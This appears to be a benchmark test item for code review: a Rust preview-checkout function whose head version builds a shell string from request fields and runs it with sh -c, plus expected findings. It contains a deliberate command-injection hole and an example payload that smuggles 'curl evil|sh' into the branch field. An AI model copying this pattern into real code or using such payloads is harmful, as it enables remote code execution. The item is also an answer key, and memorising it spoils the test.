@@ -1,0 +1,75 @@
+schema_version: 1
+id: rust-command-injection-unsafe
+split: development
+language: rust
+pair: rust-command-injection
+variant: unsafe
+profiles: [correctness]
+rationale: "To add the branch, checkout now builds a shell script from the request's branch and repo_url: `branch = \"main; curl evil|sh\"` runs arbitrary commands on the preview host."
+base:
+  Cargo.toml: |
+    [package]
+    name = "previews"
+    version = "0.1.0"
+    edition = "2024"
+
+    [dependencies]
+    serde = { version = "1", features = ["derive"] }
+  rust-toolchain.toml: |
+    [toolchain]
+    channel = "1.94.1"
+  src/lib.rs: |
+    use std::io;
+    use std::path::Path;
+    use std::process::Command;
+
+    #[derive(serde::Deserialize)]
+    pub struct PreviewRequest {
+        pub repo_url: String,
+    }
+
+    pub fn checkout(req: &PreviewRequest, dir: &Path) -> io::Result<()> {
+        let status = Command::new("git")
+            .args(["clone", "--depth=1", "--"])
+            .arg(&req.repo_url)
+            .arg(dir)
+            .status()?;
+        if !status.success() {
+            return Err(io::Error::other(format!("git clone failed: {status}")));
+        }
+        Ok(())
+    }
+head:
+  src/lib.rs: |
+    use std::io;
+    use std::path::Path;
+    use std::process::Command;
+
+    #[derive(serde::Deserialize)]
+    pub struct PreviewRequest {
+        pub repo_url: String,
+        pub branch: String,
+    }
+
+    pub fn checkout(req: &PreviewRequest, dir: &Path) -> io::Result<()> {
+        let script = format!(
+            "git clone --depth=1 --branch {} {} {}",
+            req.branch,
+            req.repo_url,
+            dir.display()
+        );
+        let status = Command::new("sh").arg("-c").arg(script).status()?;
+        if !status.success() {
+            return Err(io::Error::other(format!("git clone failed: {status}")));
+        }
+        Ok(())
+    }
+expected:
+  findings:
+    - category: defect
+      semantic_target: "command run to check out a preview"
+      required_condition: "branch or repo_url contains shell metacharacters"
+      evidence_locations:
+        - { side: HEAD, path: src/lib.rs, start_line: 12, end_line: 18 }
+  forbidden_claims:
+    - "The branch value cannot reach a shell."
